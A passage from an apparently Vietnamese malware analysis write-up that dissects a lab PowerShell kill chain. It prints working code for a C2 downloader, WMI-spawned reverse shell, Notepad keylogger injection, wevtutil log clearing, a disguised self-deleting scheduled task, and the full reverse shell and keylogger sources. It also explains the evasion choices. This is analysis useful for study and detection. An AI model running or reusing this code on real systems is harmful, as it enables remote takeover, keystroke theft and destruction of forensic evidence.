                  "`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;" +
                  "IEX `$wc.DownloadString('$C2/revshell.ps1')"
    $revB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($revPayload))
    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
        CommandLine = "powershell.exe -NoP -W H -Exec Bypass -Enc $revB64"
    } | Out-Null
} catch {}
```

**Phân tích:**

| Thành phần | Ý nghĩa |
|---|---|
| `$revPayload` | Downloader tải `revshell.ps1` (payload reverse shell thật) |
| `Base64(UTF-16LE)` | Encode để tránh string-scan trên command line |
| `Invoke-CimMethod -ClassName Win32_Process -MethodName Create` | **Tạo process qua WMI** — thay vì `Start-Process` |
| `powershell.exe -NoP -W H -Exec Bypass -Enc $revB64` | Chạy ẩn, bypass, encoded |
| `try { } catch { }` | Nuốt lỗi — nếu C2 die, không sinh event |


#### Tại sao dùng `Invoke-CimMethod Win32_Process.Create` thay vì `Start-Process`?

| Tiêu chí | `Start-Process` | `Win32_Process.Create` (WMI) |
|---|---|---|
| Parent process | `powershell.exe` (dễ trace) | `WmiPrvSE.exe` (SYSTEM) |
| Event log | Sysmon 1 với parent rõ ràng | Sysmon 1 với parent `WmiPrvSE.exe` — bất thường hơn nhưng khó trace ngược |
| Quyền | Theo process cha | **Có thể chạy SYSTEM** (nếu WMI provider) |
| Detection | Dễ (parent-child rõ) | Khó hơn (parent là WmiPrvSE) |

→ Đây là kỹ thuật **"WMI process creation"** — rất phổ biến trong APT (Cobalt Strike, Metasploit đều dùng). Nó **che giấu parent process** và có thể **leo thang quyền** (WmiPrvSE chạy SYSTEM).

**Kết quả:** `revshell.ps1` chạy với quyền **SYSTEM** (hoặc ít nhất là quyền của WmiPrvSE), kết nối ngược về C2 → attacker có shell trên máy.


### 7.2.3. [2] Chờ Notepad mới nhất

```powershell
$np = $null
for ($i = 0; $i -lt 30; $i++) {
    $np = Get-Process notepad -EA SilentlyContinue | Sort-Object StartTime -Descending | Select -First 1
    if ($np) { break }
    Start-Sleep -Milliseconds 500
}
if (-not $np) { return }
```

- **Poll tối đa 30 lần × 500ms = 15 giây** để tìm `notepad.exe`.
- **Lấy process mới nhất** (`Sort-Object StartTime -Descending`).
- **Tại sao cần chờ?**
  - WMI filter trigger khi **notepad.exe được tạo** — nhưng có độ trễ (polling `WITHIN 5` = tối đa 5s).
  - Khi orchestrator chạy, notepad có thể **chưa kịp xuất hiện** trong danh sách process.
  - Nếu không có notepad → **return (không làm gì)** — tránh inject vào process không tồn tại.

#### Tại sao chọn "notepad mới nhất"?

- Nếu user mở nhiều Notepad, **chỉ inject vào cái vừa mở** (cái trigger WMI event).
- Tránh inject vào Notepad cũ (có thể đã bị user đóng, hoặc đã inject rồi).
- **Idempotent check (bước 3)** sẽ so sánh PID với marker để tránh inject trùng.


### 7.2.4. [3] Idempotent check — tránh inject trùng

```powershell
if (Test-Path $marker) {
    $lastPid = (Get-Content $marker -Raw).Trim()
    if ($lastPid -eq $np.Id.ToString()) { return }
}
```

- Nếu marker tồn tại và **PID trong marker trùng với PID Notepad hiện tại** → **return** (đã inject rồi).
- **Mục đích:**
  - **Tránh inject nhiều lần vào cùng process** (gây crash Notepad, hoặc tạo nhiều keylogger instance → tăng tải, dễ bị phát hiện).
  - **Idempotent** — orchestrator có thể chạy nhiều lần (mỗi lần mở Notepad) mà không gây hại.
- **Điểm yếu opsec:** marker `.syscache` là IOC rõ ràng — nếu blue team thấy file này trong `C:\Windows\Temp\` với nội dung là PID → chắc chắn malware.

### 7.2.5. [4] Tải tool inject

```powershell
try {
    $wc = New-Object Net.WebClient
    $wc.Proxy = $null
    $tool = $wc.DownloadString("$C2/Invoke-PSInject.ps1")
    Invoke-Expression $tool
} catch { return }
```

- Tải `Invoke-PSInject.ps1` — đây là **tool inject PowerShell code vào process khác** (có thể là biến thể của `Invoke-PSInject` nổi tiếng trên GitHub, hoặc custom).
- `Invoke-Expression $tool` — load tool vào session hiện tại (định nghĩa function `Invoke-PSInject`).
- `try/catch { return }` — nếu tải fail → thoát ngay, không làm gì tiếp (tránh lỗi).
- **Tại sao tải tool riêng thay vì nhúng sẵn?**
  - **Giảm kích thước orchestrator** — tool inject khá dài.
  - **Linh hoạt** — có thể update tool trên C2 mà không cần đổi orchestrator.
  - **Tách stage** — nếu tool bị AV phát hiện, chỉ stage này fail, không ảnh hưởng revshell (đã chạy trước).


### 7.2.6. [5] Build stub keylogger

```powershell
$stubPayload = "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=`$null;`$wc=New-Object Net.WebClient;`$wc.Proxy=`$null;IEX `$wc.DownloadString('$C2/keylogger.ps1')"
$StubB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($stubPayload))
if ($StubB64.Length -gt 1200) { return }
```

- **Stub** = đoạn code nhỏ sẽ được inject vào Notepad. Nhiệm vụ: tải `keylogger.ps1` và chạy.
- **Tại sao dùng stub thay vì inject thẳng keylogger?**
  - **Keylogger thật** có thể rất dài (hàng KB) → inject thẳng dễ bị phát hiện (memory scan).
  - **Stub nhỏ (~500 bytes)** → ít bị chú ý.
  - **Stub tải keylogger từ C2** → có thể update keylogger mà không cần re-inject.
- **Giới hạn `> 1200` ký tự:**
  - `Invoke-PSInject` thường có giới hạn kích thước payload (do cách inject qua `CreateRemoteThread` + `VirtualAllocEx`).
  - 1200 ký tự Base64 ≈ ~900 byte code — đủ cho stub đơn giản.
  - Nếu vượt → **return (không inject)** — tránh lỗi.

### 7.2.7. [6] Inject stub vào Notepad

```powershell
try {
    Invoke-PSInject -ProcId $np.Id -PoshCode $StubB64
    $np.Id | Out-File $marker -Force
} catch { return }
```

- `Invoke-PSInject -ProcId $np.Id -PoshCode $StubB64` — inject stub vào process Notepad (PID `$np.Id`).
- `$np.Id | Out-File $marker` — ghi PID vào marker (để idempotent check lần sau).
- `try/catch { return }` — nếu inject fail (Notepad đã đóng, hoặc bị AV chặn) → thoát.

**Kết quả:** Notepad giờ chứa **stub keylogger trong memory**. Stub sẽ tải `keylogger.ps1` từ C2 và chạy trong process Notepad — nghĩa là:

- **Keylogger chạy dưới quyền user** (Notepad là process user).
- **Ẩn trong process lành tính** — EDR khó phát hiện (Notepad không đáng ngờ).
- **Sống sót đến khi user đóng Notepad.**


### 7.2.8. [7] Clear log ngay (double)

```powershell
Start-Sleep 5
$clearArg = '/c wevtutil cl "Microsoft-Windows-PowerShell/Operational" 1>nul 2>nul'
Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait
Start-Sleep 3
Start-Process cmd.exe -ArgumentList $clearArg -WindowStyle Hidden -Wait
```

- **Chỉ clear `PowerShell/Operational`** (không clear Sysmon/WMI như stage 3) — vì:
  - Stage 2 + 3 đã clear các log khác rồi.
  - Orchestrator chạy mỗi lần mở Notepad → không muốn clear quá nhiều (gây bất thường).
- **Double clear (5s + 3s)** — xóa event vừa sinh từ chính orchestrator (revshell, inject, marker).
- Vẫn dùng `Start-Process cmd.exe` — tránh event 4100 (như stage 3).

### 7.2.9. [8] Scheduled Task — delayed clear + self-delete

```powershell
$taskName = "SysLogMaint"
if (-not (Get-ScheduledTask -TaskName $taskName -EA SilentlyContinue)) {
    try {
        $clearArg2 = '/c wevtutil cl "Microsoft-Windows-PowerShell/Operational" 1>nul 2>nul & ' +
                     'wevtutil cl "Microsoft-Windows-WMI-Activity/Operational" 1>nul 2>nul & ' +
                     'wevtutil cl "Microsoft-Windows-Sysmon/Operational" 1>nul 2>nul & ' +
                     'schtasks /Delete /TN "SysLogMaint" /F 2>nul'
        $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $clearArg2
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        Register-ScheduledTask -TaskName $taskName -Action $action `
            -Trigger $trigger -Principal $principal -Force | Out-Null
    } catch {}
}
```

**Phân tích:**


| Thành phần | Ý nghĩa |
|---|---|
| `$taskName = "SysLogMaint"` | **Tên task ngụy trang** — trông giống task bảo trì log hệ thống |
| `if (-not Get-ScheduledTask ...)` | **Idempotent** — chỉ tạo nếu chưa tồn tại |
| `$clearArg2` | Clear **3 log** (PowerShell, WMI, Sysmon) + **tự xóa task** (`schtasks /Delete`) |
| `New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)` | **Chạy 1 lần sau 1 phút** |
| `New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest` | Chạy với **quyền SYSTEM** |
| `Register-ScheduledTask ... -Force` | Tạo task |

**Mục đích:**

- **Delayed clear (1 phút sau):** xóa event mà orchestrator đã sinh trong 1 phút qua (bao gồm revshell, inject, marker, và cả event từ double clear trước đó).
- **Self-delete:** task tự xóa chính nó sau khi chạy → **không để lại persistence artifact** (khác với WMI persistence — task này chỉ là one-shot anti-forensic).
- **Tên `SysLogMaint`** — ngụy trang thành task bảo trì log hệ thống (rất khó phân biệt với task thật).
- **Chạy SYSTEM** — có quyền clear mọi log.

#### Tại sao cần delayed clear?

- Double clear ở bước 7 chỉ xóa event ngay lập tức.
- Nhưng trong **1 phút tiếp theo**, có thể có event mới sinh ra:
  - Event từ `revshell.ps1` (kết nối C2).
  - Event từ `keylogger.ps1` (nếu đã chạy).
  - Event từ chính scheduled task (task creation, execution).
- Delayed clear xóa tất cả event trong 1 phút đó.

#### Tại sao self-delete?

- **Tránh persistence artifact** — nếu task tồn tại lâu, blue team có thể thấy nó trong `schtasks /query` → IOC.
- **One-shot** — chỉ cần chạy 1 lần để dọn dẹp, không cần duy trì.
- **Giảm dấu vết** — sau khi chạy, task biến mất → khó trace.

## 7.3. Luồng thực thi đầy đủ

```TXT
[Stage 4] wmi_setup.ps1 (đã cài WMI persistence)
    │
    ├── Mỗi lần user mở Notepad
    │       │
    │       ▼
    │   WMI trigger → CommandLineEventConsumer
    │       │
    │       ▼
    │   powershell.exe -Enc <stub tải orchestrator.ps1> (SYSTEM)
    │       │
    │       ▼
    │   [Stage 5] orchestrator.ps1  ← FILE NÀY
    │       │
    │       ├── [1] RevShell: Win32_Process.Create → powershell -Enc → tải revshell.ps1
    │       │       └── Kết nối ngược về C2 → attacker có shell SYSTEM
    │       │
    │       ├── [2] Chờ Notepad mới nhất (tối đa 15s)
    │       │
    │       ├── [3] Idempotent: nếu PID đã inject → return
    │       │
    │       ├── [4] Tải Invoke-PSInject.ps1
    │       │
    │       ├── [5] Build stub keylogger (Base64, <1200 ký tự)
    │       │
    │       ├── [6] Inject stub vào Notepad → ghi marker PID
    │       │       └── Notepad chạy keylogger → tải keylogger.ps1 từ C2
    │       │
    │       ├── [7] Clear PowerShell log (5s + 3s)
    │       │
    │       └── [8] Tạo Scheduled Task "SysLogMaint" (chạy 1 phút sau)
    │               ├── Clear PowerShell, WMI, Sysmon log
    │               └── Tự xóa task (schtasks /Delete)
```

## 7.4. Tóm tắt toàn bộ kill chain (7 stage — HOÀN CHỈNH)

```TXT
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell ẩn
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader thuần)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe) nếu chưa admin
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tắt 3 PowerShell logging policies (x64 + x86)
                ├── Disable 4 event channels (PowerShell, TaskScheduler, Sysmon, WMI)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lần)
                ├── Xóa temp policy test files
                └── Spawn PowerShell MỚI → tải stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING + SELF-CLEANUP)
                ├── Tải wmi_setup.ps1
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── XÓA HKCU\Software\Classes\Discord
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1  ← WMI PERSISTENCE
                │       ├── Tạo __EventFilter (NotepadTrigger)
                │       ├── Tạo CommandLineEventConsumer (powershell -Enc ...)
                │       └── Tạo __FilterToConsumerBinding
                │               │
                │               ▼
                │       [Mỗi lần user mở Notepad]
                │               │
                │               ▼
                │       powershell.exe (SYSTEM) -Enc <stub>
                │               │
                │               ▼
                │       [Stage 5] orchestrator.ps1  ← FILE NÀY (PAYLOAD CUỐI)
                │               ├── [1] RevShell → Win32_Process.Create → revshell.ps1
                │               ├── [2] Chờ Notepad mới nhất
                │               ├── [3] Idempotent check (.syscache)
                │               ├── [4] Tải Invoke-PSInject.ps1
                │               ├── [5] Build stub keylogger
                │               ├── [6] Inject stub vào Notepad → keylogger.ps1
                │               ├── [7] Clear PowerShell log (5s + 3s)
                │               └── [8] Scheduled Task "SysLogMaint" (1 phút, tự xóa)
                │
                └── Clear 4 log (5s + 5s)
```

# 8. revshell.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>


```ps1
while ($true) {
    $client = $null
    try {
        # Dung .NET constructor truc tiep (KHONG qua New-Object cmdlet)
        # => khong sinh event 4100 khi connect fail
        $client = [System.Net.Sockets.TcpClient]::new('192.168.56.100', 4444)
    } catch {
        Start-Sleep -Seconds 30
        continue
    }

    try {
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }

        while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
            try {
                $sendback = (iex $data 2>&1 | Out-String)
            } catch {
                $sendback = "[!] $($_.Exception.Message)"
            }
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
    } catch {
        Start-Sleep -Seconds 30
    }
}
```

</details>

<br>


Phân tích `revshell.ps1` — Reverse Shell TCP (PowerShell)

Đây là **reverse shell kinh điển** — kênh điều khiển từ xa cho phép attacker gõ lệnh trên máy nạn nhân qua kết nối TCP. Đây là **payload nguy hiểm nhất về mặt tương tác** trong toàn chuỗi, vì nó cho attacker **shell SYSTEM trực tiếp**.

Điểm đáng chú ý: comment trong code (`# Dung .NET constructor truc tiep ... => khong sinh event 4100 khi connect fail`) — cùng phong cách **opsec** với các stage trước. Attacker hiểu rõ event 4100 và cố tình tránh nó ngay cả khi connect fail.

---

## 8.1. Cấu trúc tổng thể

```text
while ($true) {                         ← Vòng lặp vô hạn (persistent)
    try {
        $client = [System.Net.Sockets.TcpClient]::new("192.168.56.100", 4444)
    } catch {
        Start-Sleep 30                  ← Nếu connect fail → chờ 30s → retry
        continue
    }

    try {
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ...  ← Buffer 64KB

        while (($i = $stream.Read(...)) -ne 0) {
            $data = ASCII.GetString(...)
            $sendback = (iex $data 2>&1 | Out-String)   ← THỰC THI LỆNH
            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '  ← Prompt
            $stream.Write($sendbyte, ...)              ← Gửi output về C2
        }
        $client.Close()
    } catch {
        Start-Sleep 30                  ← Nếu lỗi → chờ 30s → retry
    }
}
```


**Luồng hoạt động:**

1. Kết nối TCP tới `192.168.56.100:4444`.
2. Nếu fail → chờ 30s → thử lại (vòng lặp vô hạn).
3. Nếu thành công → đọc lệnh từ stream → `iex` → gửi output về C2.
4. Nếu stream đóng/lỗi → chờ 30s → thử lại.

→ **Self-healing:** nếu C2 restart hoặc kết nối đứt, revshell tự động reconnect sau 30s.

---

## 8.2. Phân tích từng phần

### 8.2.1. Vòng lặp vô hạn + retry

```powershell
while ($true) {
    $client = $null
    try {
        $client = [System.Net.Sockets.TcpClient]::new('192.168.56.100', 4444)
    } catch {
        Start-Sleep -Seconds 30
        continue
    }

    ...
}
```

- `while ($true)` — vòng lặp vô hạn → revshell **chạy mãi cho đến khi process bị kill**.
- `Start-Sleep -Seconds 30` — nếu connect fail, chờ 30s rồi retry.
- `continue` — quay lại đầu vòng lặp (thử connect lại).

#### Tại sao chờ 30s?

- **Tránh spam kết nối** — nếu C2 die, không gửi hàng trăm SYN packet/giây (dễ bị IDS/EDR phát hiện).
- **Tránh CPU spike** — vòng lặp tight loop sẽ ngốn CPU 100% → dễ bị phát hiện qua performance monitoring.
- **Opsec** — 30s là "hợp lý" cho một dịch vụ hợp lệ retry.


### 8.2.2. Kết nối TCP — dùng .NET constructor trực tiếp

```powershell
$client = [System.Net.Sockets.TcpClient]::new('192.168.56.100', 4444)
```

**Tại sao dùng `[System.Net.Sockets.TcpClient]::new(...)` thay vì `New-Object`?**

Comment trong code giải thích:

```powershell
# Dung .NET constructor truc tiep (KHONG qua New-Object cmdlet)
# => khong sinh event 4100 khi connect fail
```

**Phân tích:**

| Cách | Khi connect fail | Event 4100? |
|---|---|---|
| `New-Object System.Net.Sockets.TcpClient('...', 4444)` | `New-Object` cmdlet throw terminating error → PS host ghi event 4100 | ✅ Có |
| `[System.Net.Sockets.TcpClient]::new('...', 4444)` | .NET constructor throw exception bên trong try/catch → PS host không coi là unhandled error | ❌ Không |

**Đây là kỹ thuật opsec rất tinh vi:**

- `New-Object` là **cmdlet** → lỗi của nó được PS host theo dõi → nếu không catch đúng cách → event 4100.
- `::new()` là **static method call** → lỗi là .NET exception → được `try/catch` bắt gọn → không sinh 4100.
- Attacker hiểu rõ cơ chế này và cố tình chọn cách ít bị log hơn.

**Port 4444** — port kinh điển của Metasploit reverse shell. Dù dễ bị block (nhiều firewall/IDS block 4444), nhưng trong LAN lab thì vẫn hoạt động.


### 8.2.3. Buffer 64KB

```powershell
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
```

- `$stream` — lấy NetworkStream từ TcpClient.
- `[byte[]]$bytes = 0..65535 | ...` — tạo **byte array 65536 phần tử (64KB)**, khởi tạo toàn 0.
- **Tại sao 64KB?**
  - Đủ lớn để chứa hầu hết lệnh/output (1 lệnh PowerShell thường < 64KB).
  - Đủ nhỏ để không tốn memory (64KB × 1 = 64KB, không đáng kể).
  - **Lưu ý:** đây là cách viết cũ (`0..65535 | ForEach-Object { 0 }`) — chậm hơn `New-Object byte[] 65536`, nhưng tránh dùng cmdlet (opsec — cùng lý do với `::new()`).

### 8.2.4. Vòng lặp đọc lệnh — trái tim của revshell

```powershell
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object Text.ASCIIEncoding).GetString($bytes, 0, $i)
    try {
        $sendback = (iex $data 2>&1 | Out-String)
    } catch {
        $sendback = "[!] $($_.Exception.Message)"
    }
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
```

**Phân tích từng dòng:**


| Dòng | Ý nghĩa |
|---|---|
| `$stream.Read($bytes, 0, $bytes.Length)` | Đọc tối đa 64KB từ socket vào buffer, trả về **số byte đọc được** (`$i`) |
| `-ne 0` | Nếu `$i = 0` → stream đóng (client ngắt kết nối) → thoát vòng lặp |
| `ASCIIEncoding.GetString($bytes, 0, $i)` | Decode `$i` byte thành string ASCII (lệnh từ C2) |
| `iex $data 2>&1` | **Thực thi lệnh** (`Invoke-Expression`) + redirect stderr sang stdout |
| `\| Out-String` | Chuyển output thành string (để gửi về C2) |
| `$sendback = ...` | Kết quả lệnh (hoặc error message nếu catch) |
| `'PS ' + (pwd).Path + '> '` | **Prompt giả** — giống PowerShell prompt (`PS C:\Users\...>`) |
| `$stream.Write(...)` | Gửi output + prompt về C2 |
| `$stream.Flush()` | Đảm bảo dữ liệu được gửi ngay (không buffer) |

**Điểm nguy hiểm:**

- `iex $data` — thực thi **bất kỳ lệnh PowerShell** nào attacker gửi. Đây là **full RCE (Remote Code Execution)**.
- `2>&1` — gộp stderr vào stdout → attacker thấy cả lỗi (debug dễ hơn).
- **Prompt giả** — attacker thấy `PS C:\...>` → giống shell thật, dễ tương tác.

#### Tại sao dùng ASCII thay vì UTF-8?

- ASCII đơn giản hơn, không cần xử lý multi-byte.
- Hầu hết lệnh PowerShell là ASCII.
- **Nhược điểm:** không hỗ trợ ký tự Unicode (tiếng Việt, emoji...) — nhưng attacker không cần.


### 8.2.5. Xử lý lỗi + đóng kết nối

```powershell
$client.Close()
} catch {
    Start-Sleep -Seconds 30
}
```

- `$client.Close()` — đóng kết nối khi stream đóng (client ngắt).
- `catch { Start-Sleep 30 }` — nếu có lỗi (stream read fail, write fail...) → chờ 30s → retry (vòng lặp ngoài).

**Lưu ý:** sau `catch` không có `continue` — nhưng vì đây là cuối vòng lặp `while ($true)`, nó tự động quay lại đầu → retry.

## 8.3. Luồng hoạt động chi tiết

```txt
[Stage 5] orchestrator.ps1
    │
    ▼
Invoke-CimMethod Win32_Process.Create
    │
    ▼
powershell.exe -NoP -W H -Exec Bypass -Enc <stub tải revshell.ps1>
    │
    ▼
IEX DownloadString('.../revshell.ps1')
    │
    ▼
revshell.ps1
    │
    ├── while ($true):
    │       │
    │       ├── TcpClient::new('192.168.56.100', 4444)
    │       │       │
    │       │       ├── Fail → sleep 30s → retry
    │       │       │
    │       │       └── Success:
    │       │               │
    │       │               ├── stream.Read() → nhận lệnh từ C2
    │       │               ├── iex $data → thực thi
    │       │               ├── stream.Write(output) → gửi về C2
    │       │               └── lặp đến khi stream đóng
    │       │
    │       └── (nếu lỗi) sleep 30s → retry
    │
    └── (chạy mãi cho đến khi process bị kill)
```

## 8.4. Tóm tắt toàn bộ kill chain (8 stage — HOÀN CHỈNH NHẤT)

```txt
[Stage 0]   Invoice_October.hta
                │ VBScript → PowerShell ẩn
                ▼
[Stage 0.5] powershell.exe → IEX DownloadString('.../loader.ps1')
                │
                ▼
[Stage 1]   loader.ps1 (downloader)
                │
                ▼
[Stage 1.5] stage1.ps1
                ├── UAC Bypass (ms-settings + ComputerDefaults.exe)
                └── IEX DownloadString('.../stage2.ps1')
                        │
                        ▼
[Stage 2]   stage2.ps1 (ANTI-FORENSIC)
                ├── Tắt 3 PowerShell logging policies
                ├── Disable 4 event channels (gồm Sysmon)
                ├── Kill other PowerShell
                ├── Clear 7 log (2 lần)
                └── Spawn PowerShell MỚI → tải stage3.ps1
                        │
                        ▼
[Stage 3]   stage3.ps1 (REGISTRY STAGING + SELF-CLEANUP)
                ├── Base64 → ghi HKCU\Software\Classes\Discord\Payload
                ├── Verify → decode → IEX
                ├── XÓA registry
                │       │
                │       ▼
                │   [Stage 4] wmi_setup.ps1 (WMI PERSISTENCE)
                │       ├── __EventFilter (NotepadTrigger)
                │       ├── CommandLineEventConsumer (powershell -Enc ...)
                │       └── __FilterToConsumerBinding
                │               │
                │               ▼
                │       [Mỗi lần user mở Notepad]
                │               │
                │               ▼
                │       [Stage 5] orchestrator.ps1 (PAYLOAD CUỐI)
                │               ├── [1] RevShell → Win32_Process.Create
                │               │       │
                │               │       ▼
                │               │   [Stage 6] revshell.ps1  ← FILE NÀY
                │               │       ├── while ($true):
                │               │       │   ├── TcpClient::new('192.168.56.100', 4444)
                │               │       │   ├── iex $data → thực thi lệnh
                │               │       │   └── gửi output về C2
                │               │       └── retry 30s nếu fail
                │               │
                │               ├── [2] Tải Invoke-PSInject.ps1
                │               ├── [3] Build stub keylogger
                │               ├── [4] Inject stub vào Notepad
                │               │       │
                │               │       ▼
                │               │   [Stage 7] keylogger.ps1 (chưa thấy)
                │               │       └── Ghi phím gõ → gửi C2
                │               │
                │               ├── [5] Clear PowerShell log
                │               └── [6] Scheduled Task "SysLogMaint"
                │
                └── Clear 4 log
```

# 9. keylogger.ps1

<details>
<summary>Bấm vào đây để xem nội dung</summary>

```ps1
# ============================================================
# KEYLOGGER - Ban hoan chinh (ASCII only)
# - Bat: chu, so, dau cau, phim dac biet, Shift/CapsLock dung
# - Log: C:\Users\Public\System32\kernel32.dll (masquerading)
# - Rotating log: tu xoa khi > 10MB
# ============================================================

$PublicDir  = "C:\Users\Public\System32"
$LogFile    = "$PublicDir\kernel32.dll"
$MaxLogSize = 10MB

# Tao thu muc an
if (-not (Test-Path $PublicDir)) {
    New-Item -Path $PublicDir -ItemType Directory -Force -EA SilentlyContinue | Out-Null
    attrib +h +s $PublicDir 2>$null
}

# ============================================================
# P/Invoke GetAsyncKeyState
# ============================================================
if (-not ("KeyLogger" -as [type])) {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
}

# ============================================================
# Map phim dac biet
# ============================================================
$specialKeys = @{
    8   = "[BACKSPACE]"
    9   = "[TAB]"
    13  = "[ENTER]`n"
    16  = "[SHIFT]"
    17  = "[CTRL]"
    18  = "[ALT]"
    19  = "[PAUSE]"
    20  = "[CAPSLOCK]"
    27  = "[ESC]"
    32  = " "
    33  = "[PGUP]"
    34  = "[PGDN]"
    35  = "[END]"
    36  = "[HOME]"
    37  = "[LEFT]"
    38  = "[UP]"
    39  = "[RIGHT]"
    40  = "[DOWN]"
    44  = "[PRTSC]"
    45  = "[INS]"
    46  = "[DEL]"
    91  = "[LWIN]"
    92  = "[RWIN]"
    93  = "[MENU]"
    106 = "*"
    107 = "+"
    109 = "-"
    110 = "."
    111 = "/"
    144 = "[NUMLOCK]"
    145 = "[SCROLLLOCK]"
    186 = ";"
    187 = "="
    188 = ","
    189 = "-"
    190 = "."
    191 = "/"
    192 = "``"
    219 = "["
    220 = "\"
    221 = "]"
    222 = "'"
}
# F1-F12
112..123 | ForEach-Object { $specialKeys[$_] = "[F$($_ - 111)]" }

# ============================================================
# Bang ky tu Shift (row + dau cau)
# ============================================================
$shiftMap = @{
    48=')'; 49='!'; 50='@'; 51='#'; 52='$'; 53='%'; 54='^'; 55='&'; 56='*'; 57='('
    186=':'; 187='+'; 188='<'; 189='_'; 190='>'; 191='?'
    192='~'; 219='{'; 220='|'; 221='}'; 222='"'
}

# ============================================================
# Ham lay text cua phim — xu ly Shift/CapsLock DUNG
# ============================================================
function Get-KeyText([int]$vk) {
    # Phim dac biet
    if ($specialKeys.ContainsKey($vk)) { return $specialKeys[$vk] }

    # Doc trang thai Shift va CapsLock
    $shift = ([KeyLogger]::GetAsyncKeyState(16) -band 0x8000) -ne 0
    $caps  = ([KeyLogger]::GetAsyncKeyState(20) -band 0x8000) -ne 0

    # A-Z (VK 65-90) — HOA neu Shift XOR CapsLock
    if ($vk -ge 65 -and $vk -le 90) {
        $ch = [char]$vk
        if ($shift -xor $caps) { return $ch.ToString() }         # HOA
        else                   { return $ch.ToString().ToLower() } # thuong
    }

    # 0-9 row (VK 48-57)
    if ($vk -ge 48 -and $vk -le 57) {
        if ($shift) { return $shiftMap[$vk] }
        return [string]$vk
    }

    # Numpad 0-9 (VK 96-105)
    if ($vk -ge 96 -and $vk -le 105) { return [string]($vk - 96) }

    # Dau cau co Shift
    if ($shiftMap.ContainsKey($vk) -and $shift) { return $shiftMap[$vk] }

    return ""
}

# ============================================================
# Rotating log
# ============================================================
function Test-RotateLog {
    if (Test-Path $LogFile) {
        $size = (Get-Item $LogFile -EA SilentlyContinue).Length
        if ($size -gt $MaxLogSize) {
            $backup = "$PublicDir\kernel32_$(Get-Date -Format 'yyyyMMdd_HHmmss').dll"
            Move-Item $LogFile $backup -Force -EA SilentlyContinue
            # Giu toi da 5 backup
            Get-ChildItem "$PublicDir\kernel32_*.dll" -EA SilentlyContinue |
                Sort-Object LastWriteTime -Descending |
                Select-Object -Skip 5 |
                Remove-Item -Force -EA SilentlyContinue
        }
    }
}

# ============================================================
# Theo doi phim da nhan (tranh repeat)
# ============================================================
$pressed = New-Object 'System.Collections.Generic.HashSet[int]'

# ============================================================
# Vong lap chinh
# ============================================================
$counter = 0
while ($true) {
    for ($vk = 8; $vk -le 222; $vk++) {
        try {
            $state = [KeyLogger]::GetAsyncKeyState($vk)
            if (($state -band 0x8000) -ne 0) {
                if (-not $pressed.Contains($vk)) {
                    [void]$pressed.Add($vk)
                    $txt = Get-KeyText $vk
                    if ($txt -ne "") {
                        try { [System.IO.File]::AppendAllText($LogFile, $txt) } catch { }
                    }
                }
            } else {
                if ($pressed.Contains($vk)) { [void]$pressed.Remove($vk) }
            }
        } catch { }
    }

    # Rotating log moi 5 giay (~166 vong)
    $counter++
    if ($counter -ge 166) {
        $counter = 0
        Test-RotateLog
    }

    Start-Sleep -Milliseconds 30
}
```

</details>

<br>

Phân tích `keylogger.ps1` — Phiên bản hoàn chỉnh (ASCII only)

Phân tích độc lập, không so sánh với bản gốc. Tập trung vào **cơ chế hoạt động, kỹ thuật, IOC, detection và đánh giá**.

---

## 9.1. Tổng quan

Đây là một **keylogger PowerShell chạy fileless trong process `notepad.exe`** (được inject từ `orchestrator.ps1`). Nó:

- **Ghi lại mọi phím gõ trên toàn hệ thống** (không chỉ trong Notepad).
- **Lưu log** vào `C:\Users\Public\System32\kernel32.dll` — file masquerading (giả DLL hệ thống).
- **Tự rotating** khi file > 10MB.
- **Tự ẩn thư mục log** (Hidden + System).
- **Xử lý Shift/CapsLock chính xác**, bao gồm dấu câu + ký tự đặc biệt.

---

## 9.2. Cấu trúc tổng thể

```txt
keylogger.ps1
├── [1] Cấu hình: thư mục, file log, max size
├── [2] Tạo thư mục ẩn C:\Users\Public\System32\
